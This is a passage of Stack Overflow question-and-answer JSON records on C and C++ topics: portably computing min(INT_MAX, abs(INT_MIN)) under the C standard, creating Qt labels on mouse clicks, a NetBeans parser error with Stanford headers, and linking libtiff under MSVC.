"link": "https://stackoverflow.com/users/2455888/haccks"}, "edited": false, "score": 0, "creation_date": 1429737990, "post_id": 29808593, "comment_id": 47746418, "body": "I know and OP does know it too. He is asking about how to find min of mathematical absolute value of <code>INT_MIN</code> and <code>INT_MAX</code>."}, {"owner": {"reputation": 23625, "user_id": 2868801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ec5567811049b7ce8192be0bc0246d1?s=128&d=identicon&r=PG&f=1", "display_name": "dave_thompson_085", "link": "https://stackoverflow.com/users/2868801/dave-thompson-085"}, "reply_to_user": {"reputation": 91978, "user_id": 387076, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/cFyP6.jpg?s=128&g=1", "display_name": "Gilles &#39;SO- stop being evil&#39;", "link": "https://stackoverflow.com/users/387076/gilles-so-stop-being-evil"}, "edited": false, "score": 0, "creation_date": 1429746976, "post_id": 29808593, "comment_id": 47750036, "body": "@Gilles C89 didn&#39;t specifically say 2sC 1sC S&amp;M, but it did require &quot;pure binary&quot; except for the &quot;highest&quot; bit, which was obviously intended to mean the sign bit for signed but as written also formally allowed some limited weirdness in unsigned. AFAIK no machine used any signed representation satisfying &quot;pure binary except sign&quot; other than those three, and no implementor objected to this &quot;clarification&quot; in C99."}, {"owner": {"reputation": 15544, "user_id": 864393, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59ae69e09086fed821a36d36814022c2?s=128&d=identicon&r=PG", "display_name": "Jeremy Roman", "link": "https://stackoverflow.com/users/864393/jeremy-roman"}, "edited": false, "score": 2, "creation_date": 1429748955, "post_id": 29808593, "comment_id": 47750711, "body": "haccks: If abs(INT_MIN) &gt;= INT_MAX (which you&#39;ve agreed to), then min(INT_MAX, abs(INT_MIN)) == INT_MAX."}], "tags": [], "owner": {"reputation": 15544, "user_id": 864393, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59ae69e09086fed821a36d36814022c2?s=128&d=identicon&r=PG", "display_name": "Jeremy Roman", "link": "https://stackoverflow.com/users/864393/jeremy-roman"}, "is_accepted": false, "score": 7, "last_activity_date": 1429736184, "last_edit_date": 1429736184, "creation_date": 1429736000, "answer_id": 29808593, "question_id": 29808397, "link": "https://stackoverflow.com/questions/29808397/how-to-portably-find-out-minint-max-absint-min/29808593#29808593", "title": "How to portably find out min(INT_MAX, abs(INT_MIN))?", "body": "<p>In C99 and above, <code>INT_MAX</code>.</p>\n\n<p>Quoth the spec:</p>\n\n<blockquote>\n  <p>For signed integer types, the bits of the object representation shall be divided into three\n  groups: value bits, padding bits, and the sign bit. There need not be any padding bits;\n  signed char shall not have any padding bits. There shall be exactly one sign bit.\n  Each bit that is a value bit shall have the same value as the same bit in the object\n  representation of the corresponding unsigned type (if there are M value bits in the signed\n  type and N in the unsigned type, then M \u2264 N). If the sign bit is zero, it shall not affect\n  the resulting value. If the sign bit is one, the value shall be modified in one of the\n  following ways:</p>\n  \n  <ul>\n  <li>the corresponding value with sign bit 0 is negated (sign and magnitude);</li>\n  <li>the sign bit has the value \u2212(2^M) (two\u2019s complement);</li>\n  <li>the sign bit has the value \u2212(2^M \u2212 1) (ones\u2019 complement).</li>\n  </ul>\n</blockquote>\n\n<p>(Section 6.2.6.2 of <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\">http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf</a>)</p>\n"}, {"comments": [{"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 1, "creation_date": 1429742093, "post_id": 29809849, "comment_id": 47748315, "body": "Note that the unevaluated <i>const-expr</i> <code>-INT-MIN</code> has been specifically allowed since C++14."}, {"owner": {"reputation": 256589, "user_id": 13005, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c4690b9a0df8a4c1e35c088b077942e6?s=128&d=identicon&r=PG", "display_name": "Steve Jessop", "link": "https://stackoverflow.com/users/13005/steve-jessop"}, "edited": false, "score": 0, "creation_date": 1429748223, "post_id": 29809849, "comment_id": 47750467, "body": "... and thus the code needn&#39;t compile on pre-C++14 implementations. I can&#39;t remember whether or not a diagnostic is required."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1429758080, "post_id": 29809849, "comment_id": 47753456, "body": "Actually Std C. 6.2.6.2 and its equivalent in C++ do constrain the representation so that INT_MAX must be 2^N-1 for some N and INT_MIN must be either -INT_MAX or -INT_MAX-1."}, {"owner": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 0, "creation_date": 1429769134, "post_id": 29809849, "comment_id": 47757283, "body": "Could the <code>if</code> be replaced with an <code>#if</code> ?  Or does that run into issues around the preprocessor&#39;s integer representation not necessarily being the same as the compiler&#39;s?"}], "tags": [], "owner": {"reputation": 9542, "user_id": 985296, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/fb867640ddc6aee363d96530573845b0?s=128&d=identicon&r=PG", "display_name": "stefan", "link": "https://stackoverflow.com/users/985296/stefan"}, "is_accepted": true, "score": 24, "last_activity_date": 1429795850, "last_edit_date": 1429795850, "creation_date": 1429740677, "answer_id": 29809849, "question_id": 29808397, "link": "https://stackoverflow.com/questions/29808397/how-to-portably-find-out-minint-max-absint-min/29809849#29809849", "title": "How to portably find out min(INT_MAX, abs(INT_MIN))?", "body": "<p>While the <em>typical</em> value of <code>INT_MIN</code> is -2147483648, and the <em>typical</em> value of <code>INT_MAX</code> is 2147483647, it is not guaranteed by the standard. TL;DR: The value you're searching for is <code>INT_MAX</code> in a conforming implementation. But <em>calculating</em> <code>min(INT_MAX, abs(INT_MIN))</code> isn't portable.</p>\n\n<hr>\n\n<h2>The possible values of <code>INT_MIN</code> and <code>INT_MAX</code></h2>\n\n<p><code>INT_MIN</code> and <code>INT_MAX</code> are defined by the Annex E (Implementation limits) 1 (C standard, C++ inherits this stuff):</p>\n\n<blockquote>\n  <p>The contents of the header  are given below, in alphabetical\n  order. The minimum magnitudes shown shall be replaced by\n  implementation-defined magnitudes with the same sign. The values shall\n  all be constant expressions suitable for use in #if preprocessing\n  directives. The components are described further in 5.2.4.2.1.</p>\n  \n  <p>[...]</p>\n  \n  <p><code>#define INT_MAX +32767</code></p>\n  \n  <p><code>#define INT_MIN -32767</code></p>\n  \n  <p>[...]</p>\n</blockquote>\n\n<p>The standard requires the type <code>int</code> to be an integer type that can represent the range <code>[INT_MIN, INT_MAX]</code> (section 5.2.4.2.1.).</p>\n\n<p>Then, 6.2.6.2. (Integer types, again part of the C standard), comes into play and further restricts this to what we know as <em>two's or ones' complement</em>:</p>\n\n<blockquote>\n  <p>For signed integer types, the bits of the object representation shall be divided into three\n  groups: value bits, padding bits, and the sign bit. There need not be any padding bits;\n  signed char shall not have any padding bits. There shall be exactly one sign bit.\n  Each bit that is a value bit shall have the same value as the same bit in the object\n  representation of the corresponding unsigned type (if there are M value bits in the signed\n  type and N in the unsigned type, then M \u2264 N). If the sign bit is zero, it shall not affect the resulting value. If the sign bit is one, the value shall be modified in one of the\n  following ways:</p>\n  \n  <p>\u2014 the corresponding value with sign bit 0 is negated (sign and magnitude);</p>\n  \n  <p>\u2014 the sign bit has the value \u2212(2M) (two\u2019s complement);</p>\n  \n  <p>\u2014 the sign bit has the value \u2212(2M \u2212 1) (ones\u2019 complement).</p>\n</blockquote>\n\n<p>Section 6.2.6.2. is also very important to relate the value representation of the signed integer types with the value representation of its unsigned siblings.</p>\n\n<p>This means, you either get the range <code>[-(2^n - 1), (2^n - 1)]</code> or <code>[-2^n, (2^n - 1)]</code>, where <code>n</code> is <em>typically</em> 15 or 31.</p>\n\n<h2>Operations on signed integer types</h2>\n\n<p>Now for the second thing: Operations on signed integer types, that result in a value that is not within the range <code>[INT_MIN, INT_MAX]</code>, the behavior is undefined. This is explicitly mandated in C++ by Paragraph 5/4:</p>\n\n<blockquote>\n  <p>If during the evaluation of an expression, the result is not mathematically defined or not in the range of\n  representable values for its type, the behavior is undefined.</p>\n</blockquote>\n\n<p>For C, 6.5/5 offers a very similar passage:</p>\n\n<blockquote>\n  <p>If an exceptional condition occurs during the evaluation of an expression (that is, if the\n  result is not mathematically defined or not in the range of representable values for its\n  type), the behavior is undefined.</p>\n</blockquote>\n\n<p>So what happens if the value of <code>INT_MIN</code> happens to be less than the negative of <code>INT_MAX</code> (e.g. -32768 and 32767 respectively)? Calculating <code>-(INT_MIN)</code> will be undefined, the same as <code>INT_MAX + 1</code>.</p>\n\n<p>So we need to avoid ever calculating a value that may isn't in the range of <code>[INT_MIN, INT_MAX]</code>. Lucky, <code>INT_MAX + INT_MIN</code> is always in that range, as <code>INT_MAX</code> is a strictly positive value and <code>INT_MIN</code> a strictly negative value. Hence <code>INT_MIN &lt; INT_MAX + INT_MIN &lt; INT_MAX</code>.</p>\n\n<p>Now we can check, whether, <code>INT_MAX + INT_MIN</code> is equal to, less than, or greater than 0.</p>\n\n<pre><code>`INT_MAX + INT_MIN`  |  value of -INT_MIN    | value of -INT_MAX \n------------------------------------------------------------------\n         &lt; 0         |  undefined            | -INT_MAX\n         = 0         |  INT_MAX = -INT_MIN   | -INT_MAX = INT_MIN\n         &gt; 0         |  cannot occur according to 6.2.6.2. of the C standard\n</code></pre>\n\n<p>Hence, to determine the minimum of <code>INT_MAX</code> and <code>-INT_MIN</code> (in the mathematical sense), the following code is sufficient:</p>\n\n<pre><code>if ( INT_MAX + INT_MIN == 0 )\n{\n    return INT_MAX; // or -INT_MIN, it doesn't matter\n}\nelse if ( INT_MAX + INT_MIN &lt; 0 )\n{\n    return INT_MAX; // INT_MAX is smaller, -INT_MIN cannot be represented.\n}\nelse // ( INT_MAX + INT_MIN &gt; 0 )\n{\n    return -INT_MIN; // -INT_MIN is actually smaller than INT_MAX, may not occur in a conforming implementation.\n}\n</code></pre>\n\n<p>Or, to simplify:</p>\n\n<pre><code>return (INT_MAX + INT_MIN &lt;= 0) ? INT_MAX : -INT_MIN;\n</code></pre>\n\n<p>The values in a ternary operator will only be evaluated if necessary. Hence, <code>-INT_MIN</code> is either left unevaluated (therefore cannot produce UB), or is a well-defined value.</p>\n\n<p>Or, if you want an assertion:</p>\n\n<pre><code>assert(INT_MAX + INT_MIN &lt;= 0);\nreturn INT_MAX;\n</code></pre>\n\n<p>Or, if you want that at compile time:</p>\n\n<pre><code>static_assert(INT_MAX + INT_MIN &lt;= 0, \"non-conforming implementation\");\nreturn INT_MAX;\n</code></pre>\n\n<hr>\n\n<h2>Getting integer operations right (i.e. if correctness matters)</h2>\n\n<p>If you're interested in safe integer arithmetic, have a look at my <a href=\"http://ideone.com/bGClJX\" rel=\"noreferrer\">implementation of safe integer operations</a>. If you want to see the patterns (rather than this lengthy text output) on which operations fail and which succeed, choose <a href=\"http://ideone.com/p9FqHn\" rel=\"noreferrer\">this demo</a>.</p>\n\n<p>Depending on the architecture, there may be other options to ensure correctness, such as gcc's option <code>-ftrapv</code>.</p>\n"}], "owner": {"reputation": 6043, "user_id": 3998522, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/042b8c418b7f1129fa54862a935377b8?s=128&d=identicon&r=PG&f=1", "display_name": "xiver77", "link": "https://stackoverflow.com/users/3998522/xiver77"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3468, "favorite_count": 1, "accepted_answer_id": 29809849, "answer_count": 6, "score": 31, "last_activity_date": 1431206004, "creation_date": 1429735357, "last_edit_date": 1431206004, "question_id": 29808397, "link": "https://stackoverflow.com/questions/29808397/how-to-portably-find-out-minint-max-absint-min", "title": "How to portably find out min(INT_MAX, abs(INT_MIN))?", "body": "<p>How can I portably find out the smallest of <code>INT_MAX</code> and abs(<code>INT_MIN</code>)? (That's the mathematical absolute value of <code>INT_MIN</code>, not a call to the <code>abs</code> function.)</p>\n\n<p>It should be as same as <code>INT_MAX</code> in most systems, but I'm looking for a more portable way.</p>\n"}, {"tags": ["c++", "qt"], "answers": [{"tags": [], "owner": {"reputation": 8034, "user_id": 1005230, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/cefed5d9c8ca4c87c345b488f64ecd64?s=128&d=identicon&r=PG", "display_name": "svlasov", "link": "https://stackoverflow.com/users/1005230/svlasov"}, "is_accepted": true, "score": 2, "last_activity_date": 1429735655, "creation_date": 1429735655, "answer_id": 29808477, "question_id": 29808341, "link": "https://stackoverflow.com/questions/29808341/create-widget-at-mouse-click/29808477#29808477", "title": "Create widget at mouse click", "body": "<p>You need to show the widget, and preferably set its position (if not using QLayout):</p>\n\n<pre><code>void MainWindow::mousePressEvent(QMouseEvent *e) {\n    QLabel *label = new QLabel(this);\n    label-&gt;setText(\"Hello\");\n    label-&gt;show();\n    label-&gt;move(e-&gt;pos());\n}\n</code></pre>\n"}], "owner": {"reputation": 42, "user_id": 4397805, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7483be13e139e8de5f0a3647b28c10a?s=128&d=identicon&r=PG&f=1", "display_name": "Diana", "link": "https://stackoverflow.com/users/4397805/diana"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 203, "favorite_count": 0, "accepted_answer_id": 29808477, "answer_count": 1, "score": 0, "last_activity_date": 1429736313, "creation_date": 1429735170, "last_edit_date": 1429736313, "question_id": 29808341, "link": "https://stackoverflow.com/questions/29808341/create-widget-at-mouse-click", "title": "Create widget at mouse click", "body": "<p>I'm new at Qt. How can I create a new widget at mouse click? I want to create a new label at every mouse click.</p>\n\n<pre><code>// works fine:\n\nMainWindow::MainWindow(QWidget *parent) {\n     QLabel *label = new QLabel(this);\n}\nvoid MainWindow::mousePressEvent(QMouseEvent *e) {\n     label-&gt;setText(\"Hello\");\n}\n\n// doesn't work:\nvoid MainWindow::mousePressEvent(QMouseEvent *e) {\n     QLabel *label = new QLabel(this);\n     label-&gt;setText(\"Hello\");\n}\n</code></pre>\n"}, {"tags": ["c++", "netbeans"], "comments": [{"owner": {"reputation": 7072, "user_id": 1816262, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/IcKpN.png?s=128&g=1", "display_name": "OMGtechy", "link": "https://stackoverflow.com/users/1816262/omgtechy"}, "edited": false, "score": 1, "creation_date": 1429734788, "post_id": 29808210, "comment_id": 47744560, "body": "please post the error"}, {"owner": {"reputation": 6085, "user_id": 425871, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/58MZp.jpg?s=128&g=1", "display_name": "Steve", "link": "https://stackoverflow.com/users/425871/steve"}, "edited": false, "score": 0, "creation_date": 1429735899, "post_id": 29808210, "comment_id": 47745210, "body": "Please post the error by editing your original question, and delete these comments. Use the formatting tools to make them more readable."}, {"owner": {"reputation": 3, "user_id": 4789130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccccfd5789a1653aaa52be94776447b6?s=128&d=identicon&r=PG&f=1", "display_name": "Justin Vocke", "link": "https://stackoverflow.com/users/4789130/justin-vocke"}, "edited": false, "score": 0, "creation_date": 1429736868, "post_id": 29808210, "comment_id": 47745801, "body": "Do you want me to add the error as a comment? Because each error (which is on the first header file declaration, and every line in the ReadFile class usually has multiple &quot;unexpected token&quot;. Like, the ReadFile class line has &quot;unexpected token: =&quot;. The only exception is the first header declaration which states &quot;unknown parser error&quot; on top of itself four times."}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 4789130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccccfd5789a1653aaa52be94776447b6?s=128&d=identicon&r=PG&f=1", "display_name": "Justin Vocke", "link": "https://stackoverflow.com/users/4789130/justin-vocke"}, "edited": false, "score": 0, "creation_date": 1429738022, "post_id": 29808992, "comment_id": 47746431, "body": "Ok so for m.containskey(word)) should I define an int say &quot;int iKey&quot; and replace &#39;word&#39; with m.containskey(ikey=stoi(word,&amp;sz)); as well as m[iKey]++? I haven&#39;t used that function before so just want to check it out."}, {"owner": {"reputation": 3, "user_id": 4789130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccccfd5789a1653aaa52be94776447b6?s=128&d=identicon&r=PG&f=1", "display_name": "Justin Vocke", "link": "https://stackoverflow.com/users/4789130/justin-vocke"}, "edited": false, "score": 0, "creation_date": 1429739756, "post_id": 29808992, "comment_id": 47747279, "body": "Ok I just tried it and got this message aftercompiling  cc1plus: fatal error: ../../../Desktop/cs106lib-0.3.1/headers: No such file or directory compilation terminated. make: *** [build/Debug/Cygwin_4.x-Windows/main.o] Error 1                                                                                                                It&#39;s talking about my headers  not existing but I&#39;ve already included my header folder using right click project name and right click header under my project name. It&#39;s in the directory as well..."}, {"owner": {"reputation": 3, "user_id": 4789130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccccfd5789a1653aaa52be94776447b6?s=128&d=identicon&r=PG&f=1", "display_name": "Justin Vocke", "link": "https://stackoverflow.com/users/4789130/justin-vocke"}, "edited": false, "score": 0, "creation_date": 1429739919, "post_id": 29808992, "comment_id": 47747368, "body": "This would make sense as to why there&#39;s an error on almost every line in the ReadFile class but it&#39;s only on &quot;genlib.h&quot; however the &quot;unknown parser error&quot; like I said occurs four times on top of itself on line 1."}, {"owner": {"reputation": 590, "user_id": 3723381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bce558a3d4cc7f0c30c8b40db7e4d8c0?s=128&d=identicon&r=PG", "display_name": "Austinh100", "link": "https://stackoverflow.com/users/3723381/austinh100"}, "reply_to_user": {"reputation": 3, "user_id": 4789130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccccfd5789a1653aaa52be94776447b6?s=128&d=identicon&r=PG&f=1", "display_name": "Justin Vocke", "link": "https://stackoverflow.com/users/4789130/justin-vocke"}, "edited": false, "score": 0, "creation_date": 1429740143, "post_id": 29808992, "comment_id": 47747474, "body": "do you have a genlib.h or did you mean stdlib.h?"}, {"owner": {"reputation": 3, "user_id": 4789130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccccfd5789a1653aaa52be94776447b6?s=128&d=identicon&r=PG&f=1", "display_name": "Justin Vocke", "link": "https://stackoverflow.com/users/4789130/justin-vocke"}, "edited": false, "score": 0, "creation_date": 1429740571, "post_id": 29808992, "comment_id": 47747657, "body": "I have cynig with netbeans, but in the project itself I also have my header folder from the stanford libraries, which includes a &quot;genlib.h&quot; file, which is the one declared in line 1."}, {"owner": {"reputation": 590, "user_id": 3723381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bce558a3d4cc7f0c30c8b40db7e4d8c0?s=128&d=identicon&r=PG", "display_name": "Austinh100", "link": "https://stackoverflow.com/users/3723381/austinh100"}, "reply_to_user": {"reputation": 3, "user_id": 4789130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccccfd5789a1653aaa52be94776447b6?s=128&d=identicon&r=PG&f=1", "display_name": "Justin Vocke", "link": "https://stackoverflow.com/users/4789130/justin-vocke"}, "edited": false, "score": 0, "creation_date": 1429740929, "post_id": 29808992, "comment_id": 47747827, "body": "This is a header error obviously, does this folder (../../../Desktop/cs106lib-0.3.1/headers) have all of your headers including the genlib.h file in the base directory, not in a subdirectory?"}, {"owner": {"reputation": 3, "user_id": 4789130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccccfd5789a1653aaa52be94776447b6?s=128&d=identicon&r=PG&f=1", "display_name": "Justin Vocke", "link": "https://stackoverflow.com/users/4789130/justin-vocke"}, "edited": false, "score": 0, "creation_date": 1429741343, "post_id": 29808992, "comment_id": 47747994, "body": "Yes genlib is in the header directory, there is a &quot;private&quot; subdirectory inside of &quot;headers&quot; which includes another &quot;set.h&quot; and &quot;map.h&quot; but only the private section of their respective interfaces. Would this not already be included?"}], "tags": [], "owner": {"reputation": 590, "user_id": 3723381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bce558a3d4cc7f0c30c8b40db7e4d8c0?s=128&d=identicon&r=PG", "display_name": "Austinh100", "link": "https://stackoverflow.com/users/3723381/austinh100"}, "is_accepted": false, "score": 0, "last_activity_date": 1429739383, "last_edit_date": 1429739383, "creation_date": 1429737283, "answer_id": 29808992, "question_id": 29808210, "link": "https://stackoverflow.com/questions/29808210/unkown-parser-error-in-c-netbeans/29808992#29808992", "title": "&quot;unkown parser error&quot; in c++ netbeans", "body": "<p>In your ReadFile function (in multiple places) you are attempting to use a string as the key to a Map with integers as keys.</p>\n\n<pre><code>string word;\nin &gt;&gt; word;\nif (in.fail()) break;\nif (m.containsKey(word)) \n    m[word]++;\n</code></pre>\n\n<p>In order to do this properly you will need to parse your string input into an integer. This can be achieved through the <a href=\"http://www.cplusplus.com/reference/string/stoi/\" rel=\"nofollow\">stoi</a> function or similar.</p>\n\n<p>Example</p>\n\n<pre><code>string word;\nin &gt;&gt; word;\nint iKey = stoi(word, nullptr);\nif (in.fail()) break;\nif (m.containsKey(iKey)) \n    m[iKey]++;\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 4789130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccccfd5789a1653aaa52be94776447b6?s=128&d=identicon&r=PG&f=1", "display_name": "Justin Vocke", "link": "https://stackoverflow.com/users/4789130/justin-vocke"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 797, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1429739383, "creation_date": 1429734726, "last_edit_date": 1429738315, "question_id": 29808210, "link": "https://stackoverflow.com/questions/29808210/unkown-parser-error-in-c-netbeans", "title": "&quot;unkown parser error&quot; in c++ netbeans", "body": "<p>Sorry in advance, I posted a picture but I don't have the rep yet :( The error at line 1 says \"Unknown parser error\" repeated over four lines, and starting at the ReadFile class line pretty much each line has an error saying \"unexpected token\". I have included all of the custom header files from a folder either by right clicking \"header\" under project and adding the folder containing them or by right clicking the project name itself and adding the folder there. The private folder containing the private snippets of the headers are also included. Anyone have any ideas? This is for a free collection of lectures by Stanford, and you have to download and install their custom headers.. The instructor is using Visual c++, but that shouldn't mean I can't use the files for Netbeans right, their just .h files..?</p>\n\n<pre><code>#include \"genlib.h\"\n#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include \"map.h\"\n#include \"random.h\"\n#include \"set.h\"\nusing namespace std;\n\nvoid ReadFile(ifstream &amp;in, Map&lt;int&gt; &amp;m)\n{\n    while (true) {\n        string word;\n        in &gt;&gt; word;\n        if (in.fail()) break;\n        if (m.containsKey(word)) \n            m[word]++;\n        else\n            m[word] = 1;\n    }\n    Map&lt;int&gt;::Iterator itr = m.iterator();\n    string max;\n    int maxCount = 0;\n    while (itr.hasNext()) {\n        string key = itr.next();\n        if (m[key] &gt; maxCount) {\n            max = key;\n            maxCount = m[key];\n        }\n    }\n    cout &lt;&lt; \"Max is \" &lt;&lt; max &lt;&lt; \" = \" &lt;&lt; maxCount &lt;&lt; endl;\n}\n\nvoid TestRandom()\n{\n    Set&lt;int&gt; seen;\n    while (true) {\n        int num = RandomInteger(1, 100);\n        if (seen.contains(num)) break;\n        seen.add(num);\n    }\n    Set&lt;int&gt;::Iterator itr = seen.iterator();\n    while (itr.hasNext()) \n        cout &lt;&lt; itr.next() &lt;&lt; endl;\n}\n\nint main()\n{\n    ifstream in(\"burgh.txt\");\n    Map&lt;int&gt; counts;\n    ReadFile(in, counts);\n    Randomize();\n    TestRandom();\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c++", "qt", "libtiff"], "comments": [{"owner": {"reputation": 550, "user_id": 4596797, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/980708640d67708d1f37365bbaba058d?s=128&d=identicon&r=PG&f=1", "display_name": "Andrey Derevyanko", "link": "https://stackoverflow.com/users/4596797/andrey-derevyanko"}, "edited": false, "score": 0, "creation_date": 1429734606, "post_id": 29808056, "comment_id": 47744448, "body": "Shouldn&#39;t the library be linked as <code>-ltiff</code> not <code>-llibtiff</code>?"}, {"owner": {"reputation": 335, "user_id": 136368, "user_type": "registered", "accept_rate": 18, "profile_image": "https://www.gravatar.com/avatar/fb0ddd6089b866fd0281fac546abb6f9?s=128&d=identicon&r=PG", "display_name": "jhowland", "link": "https://stackoverflow.com/users/136368/jhowland"}, "reply_to_user": {"reputation": 550, "user_id": 4596797, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/980708640d67708d1f37365bbaba058d?s=128&d=identicon&r=PG&f=1", "display_name": "Andrey Derevyanko", "link": "https://stackoverflow.com/users/4596797/andrey-derevyanko"}, "edited": false, "score": 0, "creation_date": 1429736187, "post_id": 29808056, "comment_id": 47745425, "body": "no, if it were linux or if I were using Mingw, it would be -ltiff, but Visual Studio wants it spelled out"}], "answers": [{"comments": [{"owner": {"reputation": 335, "user_id": 136368, "user_type": "registered", "accept_rate": 18, "profile_image": "https://www.gravatar.com/avatar/fb0ddd6089b866fd0281fac546abb6f9?s=128&d=identicon&r=PG", "display_name": "jhowland", "link": "https://stackoverflow.com/users/136368/jhowland"}, "edited": false, "score": 0, "creation_date": 1429801207, "post_id": 29812653, "comment_id": 47780815, "body": "I successfully built libtiff under MSVC following the instructions and it changed the problem, but I still cannot link with the libtiff functions--now I get the following:                              FrameSaveRunnable.obj : error LNK2019: unresolved external symbol TIFFWriteScanline referenced in function &quot;protected: virtual void __cdecl FrameSaveRunnable::run(void)&quot; (?run@FrameSaveRunnable@@MEAAXXZ)"}], "tags": [], "owner": {"reputation": 779, "user_id": 1837353, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2PKE7.jpg?s=128&g=1", "display_name": "Hamish Moffatt", "link": "https://stackoverflow.com/users/1837353/hamish-moffatt"}, "is_accepted": false, "score": 0, "last_activity_date": 1429756839, "last_edit_date": 1495539816, "creation_date": 1429756839, "answer_id": 29812653, "question_id": 29808056, "link": "https://stackoverflow.com/questions/29808056/cant-link-with-libtiff-in-qt-creator-msvc/29812653#29812653", "title": "Can&#39;t link with libtiff in QT Creator/MSVC", "body": "<p>You need libtiff compiled for MSVC. MSVC is the significant part of your environment, not Qt. </p>\n\n<p>See <a href=\"http://www.remotesensing.org/libtiff/build.html#PC\" rel=\"nofollow noreferrer\">http://www.remotesensing.org/libtiff/build.html#PC</a> for instructions for building it (though I'm not sure if those are up to date), or there are other answers on stackoverflow on how to do it (eg <a href=\"https://stackoverflow.com/questions/12655623/installing-libtiff-to-visual-studio-2010\">Installing LibTiff to Visual Studio 2010</a>).</p>\n"}], "owner": {"reputation": 335, "user_id": 136368, "user_type": "registered", "accept_rate": 18, "profile_image": "https://www.gravatar.com/avatar/fb0ddd6089b866fd0281fac546abb6f9?s=128&d=identicon&r=PG", "display_name": "jhowland", "link": "https://stackoverflow.com/users/136368/jhowland"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 878, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1429756839, "creation_date": 1429734213, "last_edit_date": 1429737230, "question_id": 29808056, "link": "https://stackoverflow.com/questions/29808056/cant-link-with-libtiff-in-qt-creator-msvc", "title": "Can&#39;t link with libtiff in QT Creator/MSVC", "body": "<p>I am trying to write an application that saves 16 bit tiffs.  I use QT Creator and the QT API, but can't use the QT tiff features because of the 16 bit need.  My application needs to work in both Windows and Linux. </p>\n\n<p>The Linux version works fine.  When I try and link in Visual C++/Win 7, I get the following error messages:</p>\n\n<pre><code>FrameSaveRunnable.obj : error LNK2019: unresolved external symbol __imp_TIFFClose referenced in function \"protected: virtual void __cdecl FrameSaveRunnable::run(void)\" (?run@FrameSaveRunnable@@MEAAXXZ)\nFrameSaveRunnable.obj : error LNK2019: unresolved external symbol __imp_TIFFSetField referenced in function \"protected: virtual void __cdecl FrameSaveRunnable::run(void)\" (?run@FrameSaveRunnable@@MEAAXXZ)\nFrameSaveRunnable.obj : error LNK2019: unresolved external symbol __imp_TIFFWriteScanline referenced in function \"protected: virtual void __cdecl FrameSaveRunnable::run(void)\" (?run@FrameSaveRunnable@@MEAAXXZ)\nFrameSaveRunnable.obj : error LNK2019: unresolved external symbol __imp_TIFFOpen referenced in function \"protected: virtual void __cdecl FrameSaveRunnable::run(void)\" (?run@FrameSaveRunnable@@MEAAXXZ)\ndebug\\avtcam.exe : fatal error LNK1120: 4 unresolved externals\n</code></pre>\n\n<p>The relevant parts of my .pro file look like this:</p>\n\n<pre><code>INCLUDEPATH += \"C:\\Program Files (x86)\\GnuWin32\\include\"\nLIBS += -L\"C:\\Program Files (x86)\\GnuWin32\\lib\" -llibtiff\n</code></pre>\n\n<p>I have googled and searched all over, and it seems that the problem has to do with C/C++ name incompatabilities.  There are some suggestions as to how to fix it inside of Visual Studio, but I am working in the QT environment, and dont use VS at all--just the compiler.  Is there an answer to this problem?</p>\n\n<p>My environment:  QT 5.4.0, Visual Studio 12, win 7 Pro, libtiff binaries downloaded from <a href=\"http://gnuwin32.sourceforge.net/packages/tiff.htm\" 